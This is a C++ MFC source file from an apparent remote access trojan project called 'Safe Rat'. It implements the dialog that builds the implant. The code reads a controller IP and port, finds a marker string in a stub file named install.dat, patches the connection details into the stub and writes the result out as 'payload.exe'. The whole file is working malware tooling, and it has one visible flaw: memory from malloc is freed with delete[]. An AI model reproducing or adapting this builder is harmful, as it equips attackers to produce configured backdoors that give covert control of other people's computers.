// CGenerate.cpp: 实现文件
//

#include "pch.h"
#include "Safe Rat.h"
#include "CGenerate.h"
#include "afxdialogex.h"

#include "Safe RatDlg.h"

extern CSafeRatDlg* g_pFrame;	//全局主窗口指针
// CGenerate 对话框

IMPLEMENT_DYNAMIC(CGenerate, CDialogEx)

CGenerate::CGenerate(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_GENERATE_DLG, pParent)
	, m_host(_T(""))
	, m_port(_T(""))
{
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_ICON_BUILD));
}

CGenerate::~CGenerate()
{
}

void CGenerate::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_BUTTON1, m_build);
	DDX_Text(pDX, IDC_EDIT1, m_host);
	DDX_Text(pDX, IDC_EDIT2, m_port);
}


BEGIN_MESSAGE_MAP(CGenerate, CDialogEx)
	ON_BN_CLICKED(IDC_BUTTON1, &CGenerate::OnBnClickedButton1)
END_MESSAGE_MAP()


// CGenerate 消息处理程序


BOOL CGenerate::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标


	m_host = g_pFrame->m_IniFile.GetString("safe","ip","127.0.0.1");
	m_port =  g_pFrame->m_IniFile.GetString("safe", "port", "6667");

	UpdateData(FALSE);

	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}


int memfind(const char* mem, const char* str, int sizem, int sizes)
{
	int da, i, j;
	if (sizes == 0) da = strlen(str);
	else da = sizes;
	for (i = 0; i < sizem; i++)
	{
		for (j = 0; j < da; j++)
			if (mem[i + j] != str[j])	break;
		if (j == da) return i;
	}
	return -1;
}

//点击生成
void CGenerate::OnBnClickedButton1()
{
	UpdateData(TRUE);

	if (m_host.IsEmpty() || m_port.IsEmpty()) return;

	CONNECT_INFO info = { 0 };
	info.nPort = atoi(m_port.GetBuffer());
	RtlCopyMemory(info.szHost, m_host.GetBuffer(), m_host.GetLength());


	CString strExePath;
	GetModuleFileName(NULL, strExePath.GetBuffer(MAX_PATH), MAX_PATH);
	strExePath.ReleaseBuffer();
	strExePath = strExePath.Left(strExePath.ReverseFind(_T('\\'))) +"\\Plugins\\基础插件\\install.dat" ;

	HANDLE			hfile;
	DWORD			filesize;
	//读取插件文件
	hfile = CreateFileA(strExePath.GetBuffer(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hfile == INVALID_HANDLE_VALUE)
		return;

	//获得文件大小
	filesize = GetFileSize(hfile, 0);
	//申请内存
	char* filebuff = (char*)malloc(filesize);

	DWORD lpNumberOfBytesRead;
	ReadFile(hfile, filebuff, filesize,&lpNumberOfBytesRead,0);

	DWORD offset = memfind(filebuff,"aaabbbcccdddeeefff",filesize,strlen("aaabbbcccdddeeefff"));

	if (offset != -1)
	{
		RtlCopyMemory(filebuff+offset-4,&info,sizeof(info));

		//选择保存的路径
		CFileDialog fileDlg(FALSE, ".exe","payload", OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT, "二进制|.exe|");
		fileDlg.m_ofn.lpstrTitle = _T("选择要保存的位置");
		fileDlg.m_ofn.Flags |= (OFN_FILEMUSTEXIST | OFN_PATHMUSTEXIST | OFN_EXPLORER | OFN_NOCHANGEDIR | OFN_NOTESTFILECREATE);
		if (fileDlg.DoModal() == IDOK) 	
		{
			CFile open(fileDlg.GetPathName(), CFile::modeCreate | CFile::modeWrite);
			open.Write(filebuff, filesize);
			open.Close();
		}
	}

	delete[] filebuff;
	CloseHandle(hfile);
	//保存配置
	g_pFrame->m_IniFile.SetString("safe","ip",m_host.GetBuffer());
	g_pFrame->m_IniFile.SetString("safe","port",m_port.GetBuffer());
}


BOOL CGenerate::PreTranslateMessage(MSG* pMsg)
{
	if (
		pMsg->message == WM_KEYDOWN		
		&&(	pMsg->wParam == VK_ESCAPE	 
		||	pMsg->wParam == VK_CANCEL	
		||	pMsg->wParam == VK_RETURN	
		))
		return TRUE;

	return CDialogEx::PreTranslateMessage(pMsg);
}
